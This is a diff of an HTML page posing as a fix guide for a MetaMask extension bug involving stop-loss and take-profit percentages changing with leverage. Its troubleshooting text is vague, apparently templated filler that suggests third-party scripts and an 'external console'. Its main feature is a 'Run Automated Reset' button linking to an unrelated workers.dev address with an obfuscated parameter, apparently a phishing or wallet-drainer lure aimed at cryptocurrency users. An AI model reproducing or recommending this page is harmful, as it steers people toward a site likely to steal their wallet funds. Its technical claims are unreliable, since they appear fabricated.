@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,34 +42,35 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may encounter an issue where the Stop-Loss (SL) and Take-Profit (TP) percentages unexpectedly change when adjusting the leverage settings.</li>
+<li>Users observe that the Stop-Loss (SL) and Take-Profit (TP) percentages in Metamask extension change unexpectedly when modifying the leverage.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a bug within the Metamask extension, where the internal calculations for SL and TP percentages are incorrectly linked to the leverage levels, resulting in unintended changes to these critical trading parameters.</li>
+<li>The issue arises due to a bug in the Metamask extension that incorrectly recalculates SL and TP percentages based on the updated leverage, instead of maintaining their original values.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily mitigate this issue, users can try the following manual overrides:</li>
-<li>Adjust the SL and TP percentages manually after changing the leverage to ensure they reflect the intended values.</li>
-<li>Utilize a third-party trading script that can override the Metamask extension's calculations.</li>
-<li>Implement a custom solution using a JSON configuration file, such as:</li>
+<li>To resolve this issue, users can try the following manual overrides:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Reset the SL and TP percentages manually after changing the leverage</li>
+<li>Use a custom script to maintain the original SL and TP percentages</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;leverage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;stopLossPercent&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;takeProfitPercent&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
+<span class="w">  </span><span class="nt">&quot;slPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tpPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;leverage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex trading strategy implementations.</p>
+<p>For more complex scenarios, consider adjusting the script to accommodate your specific needs. 
+You may want to use an external console to test these commands.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured.</li>
-<li>Basic understanding of trading concepts, including leverage, SL, and TP.</li>
-<li>Familiarity with JSON configuration files and scripting.</li>
+<li>Metamask extension installed and configured</li>
+<li>Latest version of the Ethereum blockchain client</li>
+<li>Basic understanding of JSON scripting and Metamask extension functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
